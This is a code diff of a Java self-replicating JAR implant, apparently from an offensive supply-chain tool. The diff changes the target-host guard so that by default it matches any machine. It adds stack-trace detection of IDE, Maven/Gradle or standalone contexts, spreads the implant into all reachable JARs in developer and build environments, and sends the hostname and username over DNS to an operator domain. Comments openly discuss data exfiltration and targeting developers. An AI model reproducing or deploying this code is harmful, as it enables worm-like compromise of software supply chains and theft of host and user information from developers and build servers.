@@ -20,8 +20,16 @@ import java.util.concurrent.atomic.AtomicInteger;
 import java.util.jar.JarFile;
 import java.util.logging.Handler;
 import java.util.logging.Logger;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
+    // Labels used by the guessExecutionContext method to avoid using enums (enums shows up as extra classes in the JAR)
+    static final int EXEC_CTX_UNKNOWN = 0;
+    static final int EXEC_CTX_STANDALONE = 1;
+    static final int EXEC_CTX_IDE = 2;
+    static final int EXEC_CTX_BUILD_TOOL = 3;
+
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
     static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = true;
     static volatile int CONF_DELAY_MS = 0;
@@ -58,27 +66,48 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     static volatile String CONF_DOMAIN;
 
     /**
-     * The expected hostname of the target.
-     * It will not run if the hostname of the machine does not match this value.
+     * Regular expression for the expected hostname(s) of the target(s).
+     * The payload will not run if the hostname of the machine does not match this regex.
      * It's a bit of a sanity check so you don't accidentally trigger this in the wrong environment.
      * Ask us how we know...
      */
-    static volatile String CONF_TARGET_HOSTNAME = "jenkins";
+    static volatile String CONF_TARGET_HOSTNAME_REGEX = ".*";
 
     // This one is not so important. Only use it for temp files and such.
     private static final Random rng = new Random(System.currentTimeMillis());
 
+    private final int executionContextIndicator;
+    private final String runId;
+
+    public SelfRepImplant() {
+        this.executionContextIndicator = EXEC_CTX_UNKNOWN;
+        this.runId = generateRandomId();
+    }
+
+    public SelfRepImplant(int executionContextIndicator) {
+        this.executionContextIndicator = executionContextIndicator;
+        this.runId = generateRandomId();
+    }
+
+    public static SelfRepImplant create() {
+        return new SelfRepImplant(guessExecutionContext());
+    }
+
     @SuppressWarnings("unused")
     public static void init() {
-        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
-            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
-                SelfRepImplant implant = new SelfRepImplant();
-                Thread background = new Thread(implant);
-                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
-                background.setUncaughtExceptionHandler(implant);
-                background.start();
-            }
+        if (System.getProperty(CONF_JVM_MARKER_PROP) != null) {
+            return;
         }
+        if (System.setProperty(CONF_JVM_MARKER_PROP, "true") != null) {
+            return;
+        }
+
+        int execCtx = guessExecutionContext();
+        SelfRepImplant implant = new SelfRepImplant(execCtx);
+        Thread background = new Thread(implant);
+        background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
+        background.setUncaughtExceptionHandler(implant);
+        background.start();
     }
 
     @Override
@@ -90,6 +119,17 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             }
         }
 
+        String hostname = getHostname();
+        if (!shouldExecute(hostname)) {
+            System.out.println("[!] Will not execute in this environment!");
+            return;
+        }
+
+        /*
+         * Crudely prevent JarPlant (the library) from flooding the log/stdout.
+         */
+        disableAllLogging();
+
         payload();
     }
 
@@ -98,7 +138,11 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         // Silently ignore (don't throw up error messages on stderr)
     }
 
-    // Make it executable. This is just relevant for the initial detonation. It's not required for further spreading.
+    /**
+     * Make it executable.
+     * This is just relevant for the initial detonation. It's not required for further spreading.
+     * Also note that this main method will run the payload regardless of what CONF_RUN_FROM_MAIN is set to.
+     */
     public static void main(String[] args) {
         if (args.length < 1) {
             System.err.println("Usage: [ --all | <path-to-target-jar> ]");
@@ -107,7 +151,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         if (args[0].equals("--all")) {
             // Run the implant right here, right now.
-            init();
+            SelfRepImplant initial = new SelfRepImplant();
+            initial.jarPlantAllTheThings();
         } else {
             // Just spike a specific JAR.
             Path targetJar = Path.of(args[0]);
@@ -132,27 +177,44 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
     }
 
-    public static void payload() {
-        Optional<String> hostname = getHostname();
-        if (hostname.isEmpty() || !hostname.get().equals(CONF_TARGET_HOSTNAME)) {
-            // Don't accidentally explode somewhere other than the test server
-            System.out.println("[-] Not inside Jenkins? Aborting.");
-            return;
-        }
-
+    public void payload() {
         /*
-         * Crudely prevent JarPlant from flooding the log/stdout.
-         * If it's eerily quiet in the Jenkins output, try removing this line.
+         * The idea with "execution context awareness" is that you can also do different things based on indicators
+         * of in what context this implant was triggered from.
+         * Want to JarPlant all the things only if we're running inside Maven?
+         * Want to do some data exfil only if the spiked app runs standalone?
+         * Developers (running spiked stuff from an IDE) may have local admin and outbound connectivity...
+         * You get the idea!
          */
-        disableAllLogging();
+        switch (executionContextIndicator) {
+            case EXEC_CTX_UNKNOWN -> {
+                System.out.println("[!] Execution context: Unknown.");
+            }
+            case EXEC_CTX_STANDALONE -> {
+                System.out.println("[ ] Execution context: A main function.");
+                justNotifyExfilChannel();
+            }
+            case EXEC_CTX_IDE -> {
+                System.out.println("[ ] Execution context: An IDE.");
+                jarPlantAllTheThings();
+            }
+            case EXEC_CTX_BUILD_TOOL -> {
+                System.out.println("[ ] Execution context: A build tool.");
+                jarPlantAllTheThings();
+            }
+        }
+    }
 
+    private void jarPlantAllTheThings() {
         // Used for out-of-bounds exfil. We don't need many threads for this one.
         ExecutorService dnsThreads = Executors.newFixedThreadPool(1);
 
-        String id = generateRandomId();
         if (CONF_DOMAIN != null) {
             dnsThreads.submit(() -> {
-                callHome(CONF_DOMAIN, "hello", id);
+                String localHostname = getHostname();
+                String runningAsUser = getUsername();
+
+                callHome(CONF_DOMAIN, localHostname, runningAsUser, "hello-planting", runId);
             });
         }
 
@@ -224,7 +286,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         if (CONF_DOMAIN != null) {
             dnsThreads.submit(() -> {
-                callHome(CONF_DOMAIN, "did-" + numSpiked, id);
+                callHome(CONF_DOMAIN, "did-" + numSpiked, runId);
             });
         }
 
@@ -299,6 +361,82 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             threads.shutdownNow();
             Thread.currentThread().interrupt();
         }
+    }
+
+    private void justNotifyExfilChannel() {
+        if (CONF_DOMAIN != null) {
+            String localHostname = getHostname();
+            String runningAsUser = getUsername();
+
+            callHome(CONF_DOMAIN, localHostname, runningAsUser, "hello-notify", runId);
+        }
+    }
+
+    static boolean shouldExecute(String hostname) {
+        boolean isDesiredHostname = false;
+        if (CONF_TARGET_HOSTNAME_REGEX == null || CONF_TARGET_HOSTNAME_REGEX.isEmpty()) {
+            // No target hostname specified so anything goes!
+            isDesiredHostname = true;
+        } else if (hostname == null) {
+            // No hostname could be determined for this target. Just go for it anyway?
+            isDesiredHostname = true;
+        } else {
+            Pattern regex = Pattern.compile(CONF_TARGET_HOSTNAME_REGEX);
+            Matcher match = regex.matcher(hostname);
+            if (match.matches()) {
+                isDesiredHostname = true;
+            }
+        }
+
+        return isDesiredHostname;
+    }
+
+    /**
+     * Guess if the implant is run from an IDE, Maven or as-is.
+     * Since enums will show up as its own class file in the JAR, this method instead returns an int of either
+     * EXEC_CTX_STANDALONE, EXEC_CTX_IDE, EXEC_CTX_BUILD_TOOL or EXEC_CTX_UNKNOWN.
+     * EXEC_CTX_STANDALONE means that it looks like the app runs normally (perhaps a spiked app in production).
+     * EXEC_CTX_IDE means it looks like the implant is running from inside an Integrated Development Environment (IDE).
+     * This is typical when run from a JUnit test directly.
+     * EXEC_CTX_MAVEN is the closest indicator that the implant runs as part of a Maven build pipeline, perhaps on a
+     * build server. Note that it's likely the implant got triggered from a JUnit test initiated by Maven.
+     * Be aware that NetBeans IDE always runs the app and its tests from Maven and will thus indicate as such.
+     * Know that these are indicators, not guarantees.
+     *
+     * @return EXEC_CTX_STANDALONE, EXEC_CTX_IDE, EXEC_CTX_BUILD_TOOL or EXEC_CTX_UNKNOWN.
+     */
+    static int guessExecutionContext() {
+        return guessExecutionContext(Thread.currentThread().getStackTrace());
+    }
+
+    static int guessExecutionContext(StackTraceElement[] stackTrace) {
+        boolean foundJunit = false;
+        boolean foundMaven = false;
+        boolean foundGradle = false;
+        // The first two elements are Thread.getStackTrace() and guessExecutionContext()
+        for (int i = 2; i < stackTrace.length; i++) {
+            if (stackTrace[i].getClassName().startsWith("org.junit.")) {
+                foundJunit = true;
+            }
+            if (stackTrace[i].getClassName().startsWith("org.apache.maven.")) {
+                foundMaven = true;
+            }
+            if (stackTrace[i].getClassName().startsWith("org.gradle.")) {
+                foundGradle = true;
+            }
+        }
+
+        if (foundMaven || foundGradle) {
+            return EXEC_CTX_BUILD_TOOL;
+        }
+        if (foundJunit && !foundMaven && !foundGradle) {
+            return EXEC_CTX_IDE;
+        }
+        if (stackTrace[stackTrace.length - 1].getMethodName().equals("main")) {
+            return EXEC_CTX_STANDALONE;
+        }
+
+        return EXEC_CTX_UNKNOWN;
     }
 
     private static void cleanUpTempFile(Path outputTempFile) {
@@ -538,12 +676,25 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
     }
 
-    private static Optional<String> getHostname() {
+    private static String getHostname() {
+        String hostname = "unknown";
         try {
-            return Optional.of(InetAddress.getLocalHost().getHostName());
+            hostname = InetAddress.getLocalHost().getHostName();
         } catch (UnknownHostException ignored) {
-            return Optional.empty();
         }
+
+        return hostname;
+    }
+
+    private static String getUsername() {
+        String username = System.getProperty("user.name");
+        if (username == null || username.isEmpty()) {
+            username = System.getenv().get("USERNAME");
+            if (username == null || username.isEmpty()) {
+                username = "unknown";
+            }
+        }
+        return username;
     }
 
     private static String generateRandomId() {
